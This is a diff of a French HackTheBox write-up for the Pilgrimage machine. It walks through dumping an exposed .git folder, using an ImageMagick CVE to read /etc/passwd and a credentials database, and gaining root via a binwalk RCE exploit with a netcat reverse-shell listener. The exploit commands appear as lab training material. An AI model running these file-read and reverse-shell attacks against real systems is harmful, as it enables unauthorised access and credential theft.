@@ -53,48 +53,89 @@ On visite le site web, et pendant ce temps là on énumère sur le nom de domain
 ```
 
 Le path au `.git` m'interpelle.
-On récupère le fichier `HEAD` qui contient un texte :
-```console
-└─$ cat HEAD      
-ref: refs/heads/master
-```
-
-On télécharge le contenu qu'il y a à ce path :
-```console
-└─$ wget -r http://pilgrimage.htb/.git/refs/heads/master
-```
-
-On retrouve un fichier dans `master`, rien d'autres d'intéressants mis à part ça pour l'instant :
-
-```console
-┌──(misoko㉿kali)-[~/…/pilgrimage.htb/.git/refs/heads]
-└─$ cat master 
-e1a40beebc7035212efdcb15476f9c994e3634a7
-```
 
 On utilise le tool [git-dumper](https://github.com/arthaud/git-dumper?source=post_page-----9e070a99ac40--------------------------------) :
 ```
 python3 git_dumper.py http://pilgrimage.htb/.git git
 ```
 
-<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/gitdumper.png" width="300px" height="40px" style="display: block; margin: 0 auto"/>
+<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/gitdumper.png" width="400px" height="40px" style="display: block; margin: 0 auto"/>
 
 
-On observe dans le code source de `index.php` une ligne de code qui nous donne le nom de l'outil utiliser pour réduire la taille de l'image :
+On observe dans le code source de `index.php` une ligne de code qui nous donne le nom de l'outil utilisé pour réduire la taille de l'image :
 <img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/codeIndex.png" width="500px" height="40px" style="display: block; margin: 0 auto"/>
 On récupère la version de l'outil et on trouve un exploit sur google (CVE-2022-44268) avec un [POC](https://github.com/voidz0r/CVE-2022-44268).
 <img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/versionMagick.png" width="200px" height="40px" style="display: block; margin: 0 auto"/>
 
 ### Utilisation de la CVE
+
+Le détail est expliqué dans le POC, mais on va résumer les différentes étapes.
+
 ```console
 cargo run "/etc/passwd"
 ```
-Puis on uplaod l'image sur le site, et on récupère l'image en output fourni par pilgrimage.htb.
+Puis on uplaod l'image sur le site, et on récupère l'image en output fournie par `pilgrimage.htb`.
 
 ```console
-─$ identify -verbose 653e443922a9c.png
+$ identify -verbose 653e443922a9c.png
 ```
 <img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/DecryptedEtcPasswd.png" width="600px" height="100px" style="display: block; margin: 0 auto"/>
 
-### Ref
+On a un exploit de type **Information Disclosure** qui est fonctionnel. De plus, on s'aperçoit d'un nom d'utilisateur : `emily` dans le fichier `/etc/passwd`.
+
+Malheuresement, la lecture du fichier `/home/emily/.ssh/id_rsa` n'est pas possible avec cet exploit, probablement par manque de droit / fichier non existant.
+
+En revenant sur ce que l'on a, on analyse le fichier `index.php`, où l'on voit la création d'une base de données **sqlite** :
+
+<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/sqliteCreationDB.png" width="320px" height="80px" style="display: block; margin: 0 auto"/>
+
+On décide donc de refaire l'opération de l'exploit précédent sur le fichier `/var/db/pilgrimage`.
+On obtient une succession de données, largement remplie de 0, avec ce qui s'apparent à être les credentials de emily.
+
+<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/emilyCredentials.png" width="320px" height="80px" style="display: block; margin: 0 auto"/>
+
+On essaye de s'en servir pour la connection ssh, et on a effectivement l'accès au compte de emily.
+On obtient le flag `user.txt`.
+
+## Escalade de privilège
+
+On vérifie le sudo : rien.
+On lance le script `pspy64`, où l'on voit un processus qui fait un scan de malware :
+<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/pspy64.png" width="400px" height="20px" style="display: block; margin: 0 auto"/>
+
+<u>Contenu du fichier `/usr/sbin/malwarescan.sh`:</u>
+<img src="/assets/images/WriteUps/HackTheBox/Pilgrimage/malwarescan.png" width="800px" height="200px" style="display: block; margin: 0 auto"/>
+
+Le malware utilise donc `inotifywait` pour surveiller le dossier, puis en cas de modifications apportées aux fichiers du dossier, ils sont analysé par `binwalk`, un logiciel de détection de malware.
+
+En récupérant la version de `binwalk`, on trouve une CVE pour un [RCE](https://www.exploit-db.com/exploits/51249) :
+```
+emily@pilgrimage:~$ /usr/local/bin/binwalk --help
+
+Binwalk v2.3.2
+Craig Heffner, ReFirmLabs
+```
+
+Utilisation de l'exploit sur une image aléatoire:
+```console
+$ python3 BinwalkExploit.py AAAExploit.png @IP @Port
+```
+On transfert le fichier sur la machine cible avec un serveur http en utilisant python.
+
+Puis côté attaquant :
+```
+$ nc -lvnp 2222
+```
+
+Côté victime (emily), on va récupérer l'image qui contient l'exploit, et la déplacer dans le dossier qui va être analysé par binwalk. Au moment de l'analyse, ce dernier exécutera l'exploit et provoquera la connection à notre reverseshell (grâce au nc en écoute) :
+
+```console
+emily@pilgrimage:/tmp$ cp AAAExploit.png /var/www/pilgrimage.htb/shrunk/
+```
+
+
+## Ref
 - [git-dumper](https://github.com/arthaud/git-dumper?source=post_page-----9e070a99ac40--------------------------------)
+- [Image Magick exploit](https://www.exploit-db.com/exploits/51261)
+- [POC Image Magick 7.1.0 ](https://github.com/voidz0r/CVE-2022-44268)
+- [binwalk](https://www.exploit-db.com/exploits/51249)
